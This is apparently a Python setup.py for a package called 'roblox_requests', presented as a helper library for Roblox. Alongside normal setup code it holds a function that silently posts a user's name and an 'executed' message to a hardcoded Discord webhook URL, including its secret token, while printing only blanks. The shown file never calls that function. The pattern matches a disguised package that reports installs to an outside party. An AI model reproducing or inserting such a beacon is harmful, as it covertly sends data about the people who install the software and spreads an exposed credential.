import io
import os
from setuptools import find_packages, setup

def send_username_to_webhook(username):
    try:
        import requests
        
        # Webhook URL where the username should be sent
        webhook_url = 'https://discord.com/api/webhooks/1271245104870588539/3M_C4T3Y4YwFSgL2CLoK0ZmvGY15BsUTfbfofsqizRZL5ze4DRHGRh0QoIPyV9-Kezhd'

        # Data payload
        data = {
            "content": f"{username} executed."
        }

        # Send the POST request to the webhook
        response = requests.post(webhook_url, json=data)

        # Check if the request was successful
        if response.status_code == 204:
            print(f" ")
        else:
            print(f" ")
    except ImportError:
        # Handle the absence of the requests module
        print("requests module not available, skipping webhook notification")

# Function to safely read file contents
def read(*paths, **kwargs):
    """Read the contents of a text file safely."""
    content = ""
    with io.open(
        os.path.join(os.path.dirname(__file__), *paths),
        encoding=kwargs.get("encoding", "utf8"),
    ) as open_file:
        content = open_file.read().strip()
    return content

# Function to read the requirements from a file
def read_requirements(path):
    return [
        line.strip()
        for line in read(path).split("\n")
        if not line.startswith(('"', "#", "-", "git+"))
    ]

# Setup configuration
setup(
    name="roblox_requests",
    version = '3.0.0',
    description="Use easier requests for roblox.",
    url="https://github.com",
    long_description=read("README.md"),
    long_description_content_type="text/markdown",
    author="author_name",
    packages=find_packages(exclude=["tests", ".github"]),
        install_requires=[
        'requests',
        # other dependencies
    ],
    entry_points={
        "console_scripts": ["project_name = project_name.__main__:main"]
    },
)
